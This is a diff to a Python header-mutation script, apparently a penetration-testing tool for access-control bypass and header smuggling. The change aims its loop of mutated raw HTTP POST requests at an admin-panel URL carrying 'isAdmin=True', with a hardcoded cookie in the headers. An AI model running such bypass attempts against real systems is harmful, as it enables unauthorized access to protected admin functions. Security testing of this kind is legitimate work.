@@ -4,6 +4,8 @@ import ssl
 import sqlite3
 import json
 
+from acl_bypass_char import get_base_url
+
 
 def raw_http_request(host, port=443, method="GET", path="/", proxy=None,
                      insecure=False, headers=None, raw_headers=None,
@@ -1752,11 +1754,16 @@ if __name__ == "__main__":
         for mutation_header in all_mutation_headers.get(mutation_header_key):
             ##* Modify from here to suite target.
 
+            #* replace target_url string with target FULL URL
+            target_full_url = "https://example.com/admin/panel/v2/access?isAdmin=True"  
+
             raw_hdrs = mutation_header   # verbatim, will NOT be edited
 
             #* replace required_headers string with headers target requires
             required_headers = """Cookie: datadome=1xlM0MFE3Q0HSqwA2cWg6i
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"""
+
+            url_path = target_full_url.replace(get_base_url(target_full_url), "")
 
             # NOTE: Do NOT include a Content-Length header in `headers` when providing a `body`. The function automatically calculates and adds Content-Length for POST, PUT, PATCH requests.
             headers = parse_headers(required_headers)
@@ -1773,7 +1780,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 F
                 "example.com",
                 port=443,
                 method="POST", 
-                path="/",
+                path=url_path,
                 # proxy=("127.0.0.1", 9090),  #! Use proxy with caution, as it might reject some requests containing mutated headers sent with the intention of Header Smuggling.
                 insecure=True,
                 headers=headers,
